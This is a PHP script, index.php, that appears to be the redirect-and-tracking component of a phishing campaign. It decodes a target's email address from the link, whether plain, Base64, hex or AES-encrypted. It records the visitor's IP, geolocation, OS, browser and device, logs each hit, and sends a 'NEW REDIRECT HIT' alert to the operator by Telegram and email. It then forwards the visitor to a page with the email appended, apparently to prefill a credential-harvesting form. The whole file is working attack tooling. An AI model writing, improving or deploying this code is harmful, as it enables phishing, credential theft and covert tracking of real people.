<?php
// index.php – Full Robust Military Grade Redirect
// Supports: Plain | Base64 | Hex | AES-256-GCM | AES-256-CBC (both methods)
require_once 'config.php';

// ========== Get clean path ==========
$path = isset($_GET['path']) ? trim($_GET['path']) : '';
$path = strtok($path, '#'); // ignore everything after #
$path = rtrim($path, '/');
$segments = preg_split('/[\/#]+/', $path);
$input = end($segments) ?: '';

// ========== Decode email (supports ALL formats) ==========
$email = null;
$decrypt_status = 'none';
$decrypt_method = '';

// 1. Plain email
if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
    $email = $input;
    $decrypt_status = 'success';
    $decrypt_method = 'plain';
}

// 2. Base64
if (!$email) {
    $decoded = base64_decode($input, true);
    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        $email = $decoded;
        $decrypt_status = 'success';
        $decrypt_method = 'base64';
    }
}

// 3. Hex
if (!$email && ctype_xdigit($input) && strlen($input) % 2 === 0) {
    $decoded = @hex2bin($input);
    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        $email = $decoded;
        $decrypt_status = 'success';
        $decrypt_method = 'hex';
    }
}

// 4. AES Encrypted (tries GCM + both CBC methods)
if (!$email) {
    $result = decrypt_email($input, $secret_key);
    if ($result['email']) {
        $email = $result['email'];
        $decrypt_status = 'success';
        $decrypt_method = $result['method'];
    } else {
        $decrypt_status = 'failed';
        $decrypt_method = $result['reason'];
    }
}

// ========== Visitor Intelligence ==========
$visitor = get_visitor_intelligence($email, $input);
$visitor['decrypt_status'] = $decrypt_status;
$visitor['decrypt_method'] = $decrypt_method;
$visitor['raw_input'] = $input;

// Log
log_visit($visitor);

// Notify only if we successfully got a valid email
if ($email && filter_var($email, FILTER_VALIDATE_EMAIL)) {
    send_notifications($email, $visitor);
}

// ========== Final Redirect (clean) ==========
if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header("Location: " . $redirect_base, true, 302);
    exit;
}

$final_url = $redirect_base . $email; // NO urlencode
header("Location: " . $final_url, true, 302);
exit;


// =========================================================
// ==================== FUNCTIONS ==========================
// =========================================================

function decrypt_email($data, $secret_key) {
    if (empty($data)) {
        return ['email' => null, 'method' => '', 'reason' => 'empty_input'];
    }

    // Convert Base64URL → normal Base64
    $data = strtr($data, '-_', '+/');
    $pad = strlen($data) % 4;
    if ($pad > 0) {
        $data .= str_repeat('=', 4 - $pad);
    }

    $raw = base64_decode($data, true);
    if (!$raw) {
        return ['email' => null, 'method' => '', 'reason' => 'invalid_base64'];
    }

    // ========== Method A: AES-256-GCM (your current PHP mailer) ==========
    // Format: IV (12) + Tag (16) + Ciphertext
    if (strlen($raw) > 28) {
        $iv         = substr($raw, 0, 12);
        $tag        = substr($raw, 12, 16);
        $ciphertext = substr($raw, 28);

        $key = hash('sha256', $secret_key, true);

        $decrypted = openssl_decrypt(
            $ciphertext,
            'aes-256-gcm',
            $key,
            OPENSSL_RAW_DATA,
            $iv,
            $tag
        );

        if ($decrypted !== false) {
            $email = trim($decrypted);
            if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                return ['email' => $email, 'method' => 'aes_gcm', 'reason' => ''];
            }
        }
    }

    // ========== Method B & C: AES-256-CBC (both styles) ==========
    if (strlen($raw) > 16) {
        $iv = substr($raw, 0, 16);
        $ciphertext = substr($raw, 16);

        // Method B: JS style (first 32 hex chars as string)
        $key1 = substr(hash('sha256', $secret_key), 0, 32);
        $decrypted1 = openssl_decrypt($ciphertext, 'aes-256-cbc', $key1, OPENSSL_RAW_DATA, $iv);
        if ($decrypted1 !== false) {
            $email = trim($decrypted1);
            if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                return ['email' => $email, 'method' => 'aes_cbc_js', 'reason' => ''];
            }
        }

        // Method C: Classic binary key
        $key2 = hash('sha256', $secret_key, true);
        $decrypted2 = openssl_decrypt($ciphertext, 'aes-256-cbc', $key2, OPENSSL_RAW_DATA, $iv);
        if ($decrypted2 !== false) {
            $email = trim($decrypted2);
            if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                return ['email' => $email, 'method' => 'aes_cbc_binary', 'reason' => ''];
            }
        }
    }

    return ['email' => null, 'method' => '', 'reason' => 'all_methods_failed'];
}

function get_visitor_intelligence($email, $input) {
    $ip = get_real_ip();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $geo = get_geo_data($ip);

    return [
        'time'       => date('Y-m-d H:i:s'),
        'ip'         => $ip,
        'email'      => $email ?: 'INVALID',
        'input'      => $input,
        'country'    => $geo['country'] ?? 'Unknown',
        'city'       => $geo['city'] ?? 'Unknown',
        'region'     => $geo['region'] ?? 'Unknown',
        'isp'        => $geo['isp'] ?? 'Unknown',
        'org'        => $geo['org'] ?? 'Unknown',
        'os'         => detect_os($ua),
        'browser'    => detect_browser($ua),
        'device'     => detect_device($ua),
        'user_agent' => $ua,
        'referer'    => $_SERVER['HTTP_REFERER'] ?? 'direct'
    ];
}

function get_real_ip() {
    $headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function get_geo_data($ip) {
    if ($ip === '127.0.0.1' || $ip === '::1') {
        return ['country'=>'Local','city'=>'Local','region'=>'Local','isp'=>'Local','org'=>'Local'];
    }

    $apis = [
        function($ip) {
            $ctx = stream_context_create(['http'=>['timeout'=>3]]);
            $json = @file_get_contents("https://ipapi.co/{$ip}/json/", false, $ctx);
            $d = json_decode($json, true);
            if ($d && empty($d['error'])) {
                return [
                    'country' => $d['country_name'] ?? 'Unknown',
                    'city'    => $d['city'] ?? 'Unknown',
                    'region'  => $d['region'] ?? 'Unknown',
                    'isp'     => $d['org'] ?? 'Unknown',
                    'org'     => $d['org'] ?? 'Unknown'
                ];
            }
            return null;
        },
        function($ip) {
            $ctx = stream_context_create(['http'=>['timeout'=>3]]);
            $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org", false, $ctx);
            $d = json_decode($json, true);
            if ($d && ($d['status'] ?? '') === 'success') {
                return [
                    'country' => $d['country'] ?? 'Unknown',
                    'city'    => $d['city'] ?? 'Unknown',
                    'region'  => $d['regionName'] ?? 'Unknown',
                    'isp'     => $d['isp'] ?? 'Unknown',
                    'org'     => $d['org'] ?? 'Unknown'
                ];
            }
            return null;
        },
        function($ip) {
            $ctx = stream_context_create(['http'=>['timeout'=>3]]);
            $json = @file_get_contents("https://ipinfo.io/{$ip}/json", false, $ctx);
            $d = json_decode($json, true);
            if ($d && empty($d['error'])) {
                return [
                    'country' => $d['country'] ?? 'Unknown',
                    'city'    => $d['city'] ?? 'Unknown',
                    'region'  => $d['region'] ?? 'Unknown',
                    'isp'     => $d['org'] ?? 'Unknown',
                    'org'     => $d['org'] ?? 'Unknown'
                ];
            }
            return null;
        },
        function($ip) {
            $ctx = stream_context_create(['http'=>['timeout'=>3]]);
            $json = @file_get_contents("https://freeipapi.com/api/json/{$ip}", false, $ctx);
            $d = json_decode($json, true);
            if ($d) {
                return [
                    'country' => $d['countryName'] ?? 'Unknown',
                    'city'    => $d['cityName'] ?? 'Unknown',
                    'region'  => $d['regionName'] ?? 'Unknown',
                    'isp'     => 'Unknown',
                    'org'     => 'Unknown'
                ];
            }
            return null;
        }
    ];

    foreach ($apis as $api) {
        $result = $api($ip);
        if ($result) return $result;
    }

    return ['country'=>'Unknown','city'=>'Unknown','region'=>'Unknown','isp'=>'Unknown','org'=>'Unknown'];
}

function detect_os($ua) {
    $ua = strtolower($ua);
    if (strpos($ua, 'windows nt 11') !== false) return 'Windows 11';
    if (strpos($ua, 'windows nt 10.0') !== false) return 'Windows 10';
    if (strpos($ua, 'windows nt 6.3') !== false) return 'Windows 8.1';
    if (strpos($ua, 'windows nt 6.1') !== false) return 'Windows 7';
    if (strpos($ua, 'mac os x') !== false) return 'macOS';
    if (strpos($ua, 'android') !== false) return 'Android';
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false) return 'iOS';
    if (strpos($ua, 'linux') !== false) return 'Linux';
    return 'Unknown';
}

function detect_browser($ua) {
    $ua = strtolower($ua);
    if (strpos($ua, 'edg/') !== false) return 'Microsoft Edge';
    if (strpos($ua, 'chrome') !== false && strpos($ua, 'edg/') === false) return 'Google Chrome';
    if (strpos($ua, 'firefox') !== false) return 'Mozilla Firefox';
    if (strpos($ua, 'safari') !== false && strpos($ua, 'chrome') === false) return 'Safari';
    if (strpos($ua, 'opera') !== false || strpos($ua, 'opr/') !== false) return 'Opera';
    if (strpos($ua, 'msie') !== false || strpos($ua, 'trident/') !== false) return 'Internet Explorer';
    return 'Unknown';
}

function detect_device($ua) {
    $ua = strtolower($ua);
    if (strpos($ua, 'mobile') !== false || strpos($ua, 'android') !== false || strpos($ua, 'iphone') !== false) return 'Mobile';
    if (strpos($ua, 'ipad') !== false || strpos($ua, 'tablet') !== false) return 'Tablet';
    return 'Desktop';
}

function log_visit($data) {
    $line = json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
    file_put_contents('visits.log', $line, FILE_APPEND | LOCK_EX);
}

function send_notifications($email, $v) {
    global $enable_email_notify, $notify_email, $enable_telegram_notify, $telegram_bot_token, $telegram_chat_id;

    $msg = "🔴 NEW REDIRECT HIT\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "📧 Email     : {$email}\n";
    $msg .= "🕒 Time      : {$v['time']}\n";
    $msg .= "🌍 Country   : {$v['country']}\n";
    $msg .= "🏙 City      : {$v['city']}\n";
    $msg .= "📍 Region    : {$v['region']}\n";
    $msg .= "🏢 ISP       : {$v['isp']}\n";
    $msg .= "💻 OS        : {$v['os']}\n";
    $msg .= "🌐 Browser   : {$v['browser']}\n";
    $msg .= "📱 Device    : {$v['device']}\n";
    $msg .= "🔢 IP        : {$v['ip']}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━";

    // EMAIL (server default sender)
    if ($enable_email_notify && !empty($notify_email)) {
        $subject = "🔴 New Redirect – {$email}";
        $headers  = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/plain; charset=UTF-8\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
        @mail($notify_email, $subject, $msg, $headers);
    }

    // TELEGRAM
    if ($enable_telegram_notify && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
        $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
        $payload = [
            'chat_id' => $telegram_chat_id,
            'text'    => $msg,
            'parse_mode' => 'HTML'
        ];
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 8,
            CURLOPT_CONNECTTIMEOUT => 5
        ]);
        @curl_exec($ch);
        curl_close($ch);
    }
}
?>